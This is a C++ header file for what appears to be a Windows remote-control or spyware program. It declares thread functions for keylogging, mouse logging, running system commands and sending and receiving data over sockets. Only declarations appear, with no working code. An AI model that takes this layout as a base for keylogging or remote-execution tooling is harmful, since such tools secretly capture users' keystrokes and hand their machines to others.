#pragma once

#define WIN32_LEAN_AND_MEAN 
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ws2_32.lib")

#include <windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>

#include <string>
#include <fstream>
#include <sstream>
#include <iostream>
#include <stdlib.h>
#include <cstdio>
#include <stdio.h>
#include <time.h>
#include <set>
#include <queue>
#include <vector>

#include "thread.h"
#include "tcpsocket.h"
#include "keylog.h"
#include "mouselog.h"
#include "screen.h"
#include "sysexec.h"
#include "fs.h"
#include "process.h"
#include "string.h"




void addonDebug(char *text, ...);

DWORD __stdcall main_thread(LPVOID lpParam);
DWORD __stdcall process_thread(LPVOID lpParam);

DWORD __stdcall socket_send_thread(LPVOID lpParam);
DWORD __stdcall socket_receive_thread(LPVOID lpParam);

DWORD __stdcall keylog_thread(LPVOID lpParam);
DWORD __stdcall mouselog_thread(LPVOID lpParam);

DWORD __stdcall sysexec_thread(LPVOID lpParam);